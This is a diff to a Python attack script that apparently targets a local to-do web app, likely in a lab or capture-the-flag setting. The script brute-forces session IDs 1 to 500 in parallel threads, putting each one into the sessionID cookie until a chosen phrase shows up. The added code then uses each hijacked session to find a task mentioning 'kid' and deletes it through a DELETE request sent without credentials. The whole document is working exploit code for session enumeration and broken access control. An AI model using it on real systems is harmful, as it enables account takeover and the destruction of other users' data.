@@ -1,7 +1,7 @@
 import requests
 import threading
 
-url = 'http://localhost:3333/tasks'
+url = 'http://localhost:4633/tasks'
 
 def check_task(session_id, phrase):
     headers = {'Cookie': f'sessionID={session_id}'}
@@ -11,7 +11,7 @@ def check_task(session_id, phrase):
     else:
         return None
 
-def findTask(phrase, end, start=1, stop_event=None, result_holder=None):
+def findTask(phrase, end, start=1, stop_event=None, result_holder=None, checked = None):
     if end < start:
         raise ValueError("End must be greater than or equal to start")
     id = start
@@ -25,16 +25,38 @@ def findTask(phrase, end, start=1, stop_event=None, result_holder=None):
         except requests.exceptions.RequestException as e:
             print(f"Error: {e}")
         if response is not None:
-            print(f"[Thread {start}-{end-1}] Found phrase in ID: {id}")
-            if result_holder is not None:
-                result_holder['result'] = f"Found task with phrase in ID: {id}\n"
-            if stop_event:
-                stop_event.set()
-            return
+            if id not in checked or checked is None:
+                print(f"[Thread {start}-{end-1}] Found phrase in ID: {id}")
+                if result_holder is not None:
+                    result_holder['result'] = id
+                if stop_event:
+                    stop_event.set()
+                return
         id += 1
     print(f"[Thread {start}-{end-1}] Finished without finding phrase.")
 
-def multThreadedFindTask(phrase, max_id=500, batch_size=20):
+def deleteKid(session_id):
+    url = 'http://localhost:4633/tasks?completed=false'
+    headers = {'Cookie': f'sessionID={session_id}'}
+    response = requests.get(url, headers=headers)
+    try:
+        tasks = response.json().get('tasks', [])
+    except Exception:
+        return None
+
+    for task in tasks:
+        description = task.get('description', '')
+        if "kid".lower() in description.lower():
+            taskid = task.get('taskid', '')
+            url = f'http://localhost:4633/tasks?taskID={taskid}'
+            response = requests.delete(url, allow_redirects=False)
+            if response.status_code == 200:
+                return "Done"
+            else:
+                return response.text
+
+
+def multThreadedFindTask(phrase, max_id=500, batch_size=20, checked = None):
     threads = []
     stop_event = threading.Event()
     result_holder = {}
@@ -42,7 +64,7 @@ def multThreadedFindTask(phrase, max_id=500, batch_size=20):
         end = min(start + batch_size, max_id + 1)
         thread = threading.Thread(
             target=findTask,
-            args=(phrase, end, start, stop_event, result_holder)
+            args=(phrase, end, start, stop_event, result_holder, checked)
         )
         threads.append(thread)
         thread.start()
@@ -53,4 +75,19 @@ def multThreadedFindTask(phrase, max_id=500, batch_size=20):
 print("What phrase do you want to search for?")
 phrase = input()
 print("Searching for tasks with phrase:", phrase)
-print(multThreadedFindTask(phrase))
+found = multThreadedFindTask(phrase)
+print(f"found in {found}")
+deletedKid = deleteKid(found)
+tested = [found,]
+while(deletedKid is None):
+    print('not darth vaders')
+    found = multThreadedFindTask(phrase, 500, 20, tested)
+    if found is None:
+        print("Unable to find")
+        break
+    deletedKid = deleteKid(found)
+    print(deletedKid) 
+    tested.append(found)
+
+print("Done")
+
